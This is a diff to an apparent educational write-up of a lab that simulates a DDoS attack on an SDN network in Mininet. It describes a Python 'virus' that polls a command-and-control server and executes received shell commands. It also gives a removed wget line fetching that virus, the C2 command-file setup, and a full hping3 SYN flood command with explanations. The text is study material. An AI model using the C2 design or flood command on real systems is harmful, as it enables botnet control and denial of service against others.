@@ -48,15 +48,9 @@ Our network topology consists of the following components:
 
 - **1 Client Host** (green): This host attempts to connect to the server and experiences the effects of the DDoS attack.
 
-The network topology can be visualized on [_GitHub_](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.assets/sandbox-network-diagram.jpg).
+![Network Topology](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.assets/sandbox-network-diagram.jpg)
 
-We create the network with a python script available on [_GitHub_](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/lab/topo.py).
-
-### Host Configuration
-
-We then want to make some hosts intentionally vulnerable to be compromised.
-
-In the [Host Compromise](#Host-Compromise) chapter, we describe how we can compromise hosts through phishing, weak passwords, and vulnerabilities but for simplicity, we will launch the virus on the compromised hosts directly. This simulates the post-compromise phase of the attack.
+We create the network on mininet with the python script [`topo.py`](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/lab/topo.py).
 
 ## Monitoring Tools
 
@@ -68,18 +62,17 @@ We also use `tcpdump` to capture and analyze packets on the network. It provides
 
 ## The Virus
 
-We will need to control the hosts in the future. To do so, we will create a simple virus that connects to a command and control server to receive commands.
+We will need to control the hosts. To do so, we will create a simple virus that connects to a command and control server to receive commands.
 
-The virus is available on [_GitHub_](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/virus/simple-virus.py).
+The virus is a simple python script, [`simple-virus.py`](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/virus/simple-virus.py), it is for demonstration purposes and thus very simple in nature.
 
-This script runs indefinitely, it retrieves the command from the command and control server (`requests.get(url)`) and executes it (`subprocess.call(command, shell=True)`). The script then sleeps for 10 seconds between each command execution.
+This script runs indefinitely, it retrieves the command from the command and control server (`urllib.request.urlopen(url)`) and executes it (`subprocess.call(command, shell=True)`). The script then sleeps for 10 seconds between each command execution.
 
 The idea is that the attacker can host a simple page that will be read by the virus to execute commands on the compromised hosts.
 
 The virus can be launched on the compromised hosts using the following command:
 
 ```bash
-wget https://<URL>/simple-virus.py
 python3 simple-virus.py &
 ```
 
@@ -93,7 +86,7 @@ We run a simple python http server like so:
 sudo python3 -m http.server 80
 ```
 
-The server will host a simple text file with the command to execute. The virus will read this file and execute the command.
+The server will host a simple text file with the command to execute. We can create a file named `command` with the command we want to execute on the compromised hosts.
 
 ```bash
 echo "ls" > command
@@ -173,14 +166,36 @@ The C2 (Command and Control) server can instruct the compromised hosts to send a
 echo "sudo hping3 -S --flood -V -d 1200 -p 80 <TARGET_IP>" > command
 ```
 
-// Explain the command
+Here is a breakdown of the command:
+- `hping3`: The tool used to send packets.
+- `-S`: The SYN flag is set in the TCP header.
+- `--flood`: Sends packets as fast as possible.
+- `-V`: Verbose mode.
+- `-d 1200`: The size of the data portion of the packet.
+- `-p 80`: The destination port.
+- `<TARGET_IP>`: The IP address of the target server.
 
-
-The compromised hosts will then execute the command, causing a denial of service.
+This will cause the compromised hosts to send a flood of SYN packets to the target server, overwhelming its capacity to handle incoming requests.
 
 # Demo
 
+The demo can be launched by cloning the source repository and running the following commands:
+
+```bash
+git clone https://github.com/ozeliurs/SDN-Security.git
+cd SDN-Security/papers/.project-files/ddos-attack/lab
+sudo python3 main.py
+```
+
+This script automates everything from creating the network topology to launching the DDoS attack and reporting the results.
+
+_Note: The demo requires Mininet to be installed on the system._
+
+![Demo](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.assets/demo.gif)
+
 # Forensics
+
+## Bandwidth
 
 After we stop the attack, we can analyze the network traffic and bandwidth usage to understand the impact of the DDoS attack on the target server.
 
@@ -190,7 +205,27 @@ We can observe the spike in network traffic during the attack.
 
 `h2` (`s1-eth2`) and `h4` (`s2-eth2`) pushing 80 Mbps each and `h5` (`s3-eth1`) pushing roughly 60 Mbps.
 
+![H2 Network Traffic](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.assets/bwm-ng/s1-eth2.png)
 
+![H4 Network Traffic](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.assets/bwm-ng/s2-eth2.png)
+
+![H5 Network Traffic](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.assets/bwm-ng/s3-eth1.png)
+
+This network traffic is all directed towards the target server, as seen in the server network traffic graph.
+
+![Server Network Traffic](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.assets/bwm-ng/attack_network_traffic.png)
+
+The traffic is distributed enough to saturate the 200 Mbps link to the server but not enough to saturate the 1 Gbps links between the switches.
+
+![Global Network Traffic](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.assets/bwm-ng/bwm_ng.gif)
+
+## Packet Capture
+
+We can analyze the packets captured by `tcpdump` to understand how the attack was carried out and the nature of the traffic generated.
+
+Finally, we can deduce how the attack unfolded.
+
+![Sequence Diagram](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.assets/sequence-attack.png)
 
 # Conclusion and Mitigation
 
